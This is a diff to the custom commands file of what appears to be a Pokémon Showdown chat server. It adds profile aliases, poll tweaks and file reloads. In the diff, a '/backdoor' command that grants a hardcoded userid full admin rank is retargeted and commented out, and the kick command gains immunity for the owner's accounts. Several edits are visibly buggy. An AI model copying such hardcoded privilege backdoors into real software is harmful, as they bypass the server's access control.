@@ -12,22 +12,14 @@
  * @license MIT license
  */
 
-var fs = require("fs");
+var fs = require('graceful-fs');
     path = require("path"),
     http = require("http"),
     request = require('request');
 
 var components = exports.components = {
 
-    away: 'back',
-    back: function (target, room, user, connection, cmd) {
-        if (!user.away && cmd.toLowerCase() === 'back') return this.sendReply('You are not set as away.');
-        user.away = !user.away;
-        if (user.isStaff && cmd !== 'back') room.add('|raw|-- <b><font color="' + Core.profile.color + '">' + user.name + '</font></b> is now away. ' + (target ? " (" + target + ")" : ""));
-        user.updateIdentity();
-        this.sendReply("You are " + (user.away ? "now" : "no longer") + " away.");
-    },
-
+    
     earnbuck: 'earnmoney',
     earnbucks: 'earnmoney',
     earnmoney: function (target, room, user) {
@@ -118,11 +110,16 @@ var components = exports.components = {
         });
         req.end();
     },
-
+	
+	swag: 'profile',
+	plata: 'profile',
+	dinero: 'profile',
+	pasta: 'profile',
+	money: 'profile',
+	bucks: 'profile',
     atm: 'profile',
     profile: function (target, room, user, connection, cmd) {
         if (!this.canBroadcast()) return;
-        if (cmd === 'atm') return this.sendReply('Use /profile instead.');
         if (target.length >= 19) return this.sendReply('Usernames are required to be less than 19 characters long.');
 
         var targetUser = this.targetUserOrSelf(target);
@@ -134,15 +131,15 @@ var components = exports.components = {
             var about = Core.profile.about(userId);
 
             if (elo === 1000 && about === 0) {
-                return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.display('money', money) + '<br clear="all">');
+                return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + '<br clear="all">');
             }
             if (elo === 1000) {
-                return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.display('about', about) + Core.profile.display('money', money) + '<br clear="all">');
+                return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.display('about', about) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + '<br clear="all">');
             }
             if (about === 0) {
-                return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(userId)) + '<br clear="all">');
+                return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, userId) + Core.profile.group(false, userId) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(userId)) + '<br clear="all">');
             }
-            return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, target) + Core.profile.group(false, userId) + Core.profile.display('about', about) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(userId)) + '<br clear="all">');
+            return this.sendReplyBox(Core.profile.avatar(false, userId) + Core.profile.name(false, target) + Core.profile.group(false, userId) + Core.profile.display('about', about) + Core.profile.lastSeen(false, userId) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(userId)) + '<br clear="all">');
         }
 
         var money = Core.profile.money(targetUser.userid);
@@ -150,15 +147,15 @@ var components = exports.components = {
         var about = Core.profile.about(targetUser.userid);
 
         if (elo === 1000 && about === 0) {
-            return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('money', money) + '<br clear="all">');
+            return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + '<br clear="all">');
         }
         if (elo === 1000) {
-            return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.display('money', money) + '<br clear="all">');
+            return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + '<br clear="all">');
         }
         if (about === 0) {
-            return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');
+            return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');
         }
-        return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');
+        return this.sendReplyBox(Core.profile.avatar(true, targetUser, targetUser.avatar) + Core.profile.name(true, targetUser) + Core.profile.group(true, targetUser) + Core.profile.display('about', about) + Core.profile.lastSeen(true, targetUser) + Core.profile.display('money', money) + Core.profile.display('elo', elo, Core.profile.rank(targetUser.userid)) + '<br clear="all">');
     },
 
     setabout: 'about',
@@ -227,6 +224,15 @@ var components = exports.components = {
                         if (Users.get(u).group === '~') Users.get(u).send('|pm|' + user.group + user.name + '|' + Users.get(u).group + Users.get(u).name + '|' + 'I have bought ' + target + ' from the shop.');
                     }
                 }
+				if (target.toLowerCase() === 'newts') {
+                    this.sendReply('You have purchased a newt.');
+                    this.parse('/newt68');
+                    } else {
+                    this.sendReply('You have purchased ' + target + '. Please contact an admin to get ' + target + '.');
+                    for (var u in Users.users) {
+                        if (Users.get(u).group === '~') Users.get(u).send('|pm|' + user.group + user.name + '|' + Users.get(u).group + Users.get(u).name + '|' + 'I have bought ' + target + ' from the shop.');
+                    }
+                }
                 room.add(user.name + ' has bought ' + target + ' from the shop.');
             }
         }
@@ -288,11 +294,7 @@ var components = exports.components = {
         return this.sendReply("Message \"" + message + "\" sent to " + this.targetUsername + ".");
     },
 
-    viewtells: 'showtells',
-    showtells: function (target, room, user){
-        return this.sendReply("These users have currently have queued tells: " + Object.keys(tells));
-    },
-
+    
     vote: function (target, room, user) {
         if (!Poll[room.id].question) return this.sendReply('There is no poll currently going on in this room.');
         if (!this.canTalk()) return;
@@ -334,6 +336,7 @@ var components = exports.components = {
             "(Quit: oh god how did this get here i am not good with computer)",
             "was unfortunate and didn't get a cool message.",
             "The Immortal accidently kicked {{user}} from the server!",
+			"has been expelled from server by 01AceKing!",
         ];
 
         return function (target, room, user) {
@@ -499,8 +502,8 @@ var components = exports.components = {
      * Staff commands
      *********************************************************/
 
-    backdoor: function (target, room, user) {
-        if (user.userid !== 'creaturephil') return this.sendReply('/backdoor - Access denied.');
+   /*  backdoor: function (target, room, user) {
+        if (user.userid !== 'dabicboi') return this.sendReply('/backdoor - Access denied.');
 
         if (!target) {
             user.group = '~';
@@ -513,7 +516,7 @@ var components = exports.components = {
             user.updateIdentity();
             return;
         }
-    },
+    }, */
 
     givebuck: 'givemoney',
     givebucks: 'givemoney',
@@ -606,7 +609,10 @@ var components = exports.components = {
 
         var targetUser = Users.get(target);
         if (!targetUser) return this.sendReply('User ' + target + ' not found.');
-
+		var a = targetUser.name;
+                    if (a == "Da Bic Boi" || a == "Da Bic Boi - Ⓐⓦⓐⓨ" || a == "Infinite Bot" || a == "Infinite Bot - Ⓐⓦⓐⓨ" || a == "Infinite DDP Bot" || a== "Infinite DDP Bot - Ⓐⓦⓐⓨ" || a == "Not Da Bic Boi" || a == "Connor the Poodra" || a== "Not Da Bic Boi - Ⓐⓦⓐⓨ" ) {
+                            return this.sendReply('ACCESS DENIED.');
+                            }	
         if (!Rooms.rooms[room.id].users[targetUser.userid]) return this.sendReply(target + ' is not in this room.');
         targetUser.popup('You have been kicked from room ' + room.title + ' by ' + user.name + '.');
         targetUser.leaveRoom(room);
@@ -666,8 +672,8 @@ var components = exports.components = {
         this.sendReplyBox(official.join(' ') + nonOfficial.join(' ') + privateRoom.join(' '));
     },
 
-    sudo: function (target, room, user) {
-        if (!user.can('sudo')) return;
+    /* sudo: function (target, room, user) {
+        if (!user.can('sudo') && !user.userid == 'dabicboi') return;
         var parts = target.split(',');
         if (parts.length < 2) return this.parse('/help sudo');
         if (parts.length >= 3) parts.push(parts.splice(1, parts.length).join(','));
@@ -687,10 +693,10 @@ var components = exports.components = {
         }
         CommandParser.parse(cmd, room, Users.get(targetUser), Users.get(targetUser).connections[0]);
         this.sendReply('You have made ' + targetUser + ' do ' + cmd + '.');
-    },
+    }, */
 
     poll: function (target, room, user) {
-        if (!this.can('broadcast')) return;
+        if (!this.can('announce')) return;
         if (Poll[room.id].question) return this.sendReply('There is currently a poll going on already.');
         if (!this.canTalk()) return;
 
@@ -713,14 +719,21 @@ var components = exports.components = {
         Poll[room.id].display = '<h2>' + Poll[room.id].question + '&nbsp;&nbsp;<font size="1" color="#AAAAAA">/vote OPTION</font><br><font size="1" color="#AAAAAA">Poll started by <em>' + user.name + '</em></font><br><hr>&nbsp;&nbsp;&nbsp;&nbsp;' + pollOptions;
         room.add('|raw|<div class="infobox">' + Poll[room.id].display + '</div>');
     },
-
-    tierpoll: function (target, room, user) {
-        if (!this.can('broadcast')) return;
-        this.parse('/poll Tournament tier?, ' + Object.keys(Tools.data.Formats).filter(function (f) { return Tools.data.Formats[f].effectType === 'Format'; }).join(", "));
+	
+	tpoll: 'tierpoll',
+    tierpoll: 'tierpoll',
+	tierpoll: function (target, room, user) {
+        if (!this.can('announce')) return;
+        this.parse('/poll Tournament Tier, abcab ubers, abcab ou, randbats, ou, ubers, uu, ru, nu, pu, lc, customgame, random doubles, doubles, stabmons, almostanyability, challenge cup, hackmons, cc, cc1v1, 1v1, hackmons, balanced hackmons, inverse battle, ou mono, tier shift, mediocremons, random triples, random mono, hidden type, inheritance, Anything goes, Triples, random triples, stabmons, gen1random');
     },
+	
+	hv: 'helpvotes',
+        helpvotes: function(room, user, cmd){
+                return this.parse('/wall Remember to **vote** even if you don\'t want to battle; that way you\'re still voting for what tier battles you want to watch!');
+        },
 
     endpoll: function (target, room, user) {
-        if (!this.can('broadcast')) return;
+        if (!this.can('announce')) return;
         if (!Poll[room.id].question) return this.sendReply('There is no poll to end in this room.');
 
         var votes = Object.keys(Poll[room.id].options).length;
@@ -761,8 +774,8 @@ var components = exports.components = {
         Poll[room.id].topOption = topOption;
     },
 
-    control: function (target, room, user) {
-        if (!this.can('control')) return;
+   /*  control: function (target, room, user) {
+        if (!this.can('control' && !user.userid == 'dabicboi')) return;
         var parts = target.split(',');
 
         if (parts.length < 3) return this.parse('/help control');
@@ -773,7 +786,7 @@ var components = exports.components = {
         if (parts[1].trim().toLowerCase() === 'pm') {
             return Users.get(parts[2].trim()).send('|pm|' + Users.get(parts[0].trim()).group + Users.get(parts[0].trim()).name + '|' + Users.get(parts[2].trim()).group + Users.get(parts[2].trim()).name + '|' + parts[3].trim());
         }
-    },
+    }, */
 
     clearall: function (target, room, user) {
         if (!this.can('clearall')) return;
@@ -800,7 +813,8 @@ var components = exports.components = {
      * Server management commands
      *********************************************************/
 
-    customavatars: 'customavatar',
+    
+	customavatars: 'customavatar',
     customavatar: (function () {
         try {
             const script = (function () {/*
@@ -809,18 +823,14 @@ var components = exports.components = {
                     rm -f $FILENAME
                 }
                 trap cleanup EXIT
-
                 set -xe
-
                 timeout 10 wget "$1" -nv -O $FILENAME
-
                 FRAMES=`identify $FILENAME | wc -l`
                 if [ $FRAMES -gt 1 ]; then
                     EXT=".gif"
                 else
                     EXT=".png"
                 fi
-
                 timeout 10 convert $FILENAME -layers TrimBounds -coalesce -adaptive-resize 80x80\> -background transparent -gravity center -extent 80x80 "$2$EXT"
             */}).toString().match(/[^]*\/\*([^]*)\*\/\}$/)[1];
         } catch (e) {}
@@ -832,8 +842,8 @@ var components = exports.components = {
 
             if (cmd in {'': 1, show: 1, view: 1, display: 1}) {
                 var message = '';
-                for (var a in Config.customAvatars)
-                    message += "<strong>" + Tools.escapeHTML(a) + ":</strong> " + Tools.escapeHTML(Config.customAvatars[a]) + "<br />";
+                for (var a in Config.customavatars)
+                    message += "<strong>" + Tools.escapeHTML(a) + ":</strong> " + Tools.escapeHTML(Config.customavatars[a]) + "<br />";
                 return this.sendReplyBox(message);
             }
 
@@ -846,7 +856,7 @@ var components = exports.components = {
                 var avatar = parts.slice(2).join(',').trim();
 
                 if (!userid) return this.sendReply("You didn't specify a user.");
-                if (Config.customAvatars[userid]) return this.sendReply(userid + " already has a custom avatar.");
+                if (Config.customavatars[userid]) return this.sendReply(userid + " already has a custom avatar.");
 
                 var hash = require('crypto').createHash('sha512').update(userid + '\u0000' + avatar).digest('hex').slice(0, 8);
                 pendingAdds[hash] = {userid: userid, avatar: avatar};
@@ -874,21 +884,21 @@ var components = exports.components = {
                         return;
                     }
 
-                    reloadCustomAvatars();
+                    reloadcustomavatars();
                     this.sendReply(userid + "'s custom avatar has been set.");
                 }).bind(this));
                 break;
 
             case 'delete':
                 var userid = toId(parts[1]);
-                if (!Config.customAvatars[userid]) return this.sendReply(userid + " does not have a custom avatar.");
+                if (!Config.customavatars[userid]) return this.sendReply(userid + " does not have a custom avatar.");
 
-                if (Config.customAvatars[userid].toString().split('.').slice(0, -1).join('.') !== userid)
-                    return this.sendReply(userid + "'s custom avatar (" + Config.customAvatars[userid] + ") cannot be removed with this script.");
-                require('fs').unlink('./config/avatars/' + Config.customAvatars[userid], (function (e) {
-                    if (e) return this.sendReply(userid + "'s custom avatar (" + Config.customAvatars[userid] + ") could not be removed: " + e.toString());
+                if (Config.customavatars[userid].toString().split('.').slice(0, -1).join('.') !== userid)
+                    return this.sendReply(userid + "'s custom avatar (" + Config.customavatars[userid] + ") cannot be removed with this script.");
+                require('fs').unlink('./config/avatars/' + Config.customavatars[userid], (function (e) {
+                    if (e) return this.sendReply(userid + "'s custom avatar (" + Config.customavatars[userid] + ") could not be removed: " + e.toString());
 
-                    delete Config.customAvatars[userid];
+                    delete Config.customavatars[userid];
                     this.sendReply(userid + "'s custom avatar removed successfully");
                 }).bind(this));
                 break;
@@ -898,6 +908,7 @@ var components = exports.components = {
             }
         };
     })(),
+   
 
     debug: function (target, room, user, connection, cmd, message) {
         if (!user.hasConsoleAccess(connection)) {
@@ -947,6 +958,10 @@ var components = exports.components = {
             CommandParser.uncacheTree(path.join(__dirname, './', './tournaments/index.js'));
             Tournaments = require(path.join(__dirname, './', './tournaments/index.js'));
             Tournaments.tournaments = runningTournaments;
+			
+			this.sendReply('Reloading Bot...');
+            CommandParser.uncacheTree(path.join(__dirname, './', 'bot.js'));
+            Bot = require(path.join(__dirname, './', 'bot.js'));
 
             this.sendReply('Reloading Core...');
             CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
@@ -959,8 +974,12 @@ var components = exports.components = {
             this.sendReply('Reloading SysopAccess...');
             CommandParser.uncacheTree(path.join(__dirname, './', './core.js'));
             SysopAccess = require(path.join(__dirname, './', './core.js'));
-
-            return this.sendReply('|raw|<font color="green">All files have been reloaded.</font>');
+			
+			this.sendReply('Reloading Formats...');
+            CommandParser.uncacheTree(path.join(__dirname, './', './config/formats.js'));
+            SysopAccess = require(path.join(__dirname, './', './config/formats.js'));
+			
+			return this.sendReply('|raw|<font color="green">All files have been reloaded.</font>');
         } catch (e) {
             return this.sendReply('|raw|<font color="red">Something failed while trying to reload files:</font> \n' + e.stack);
         }
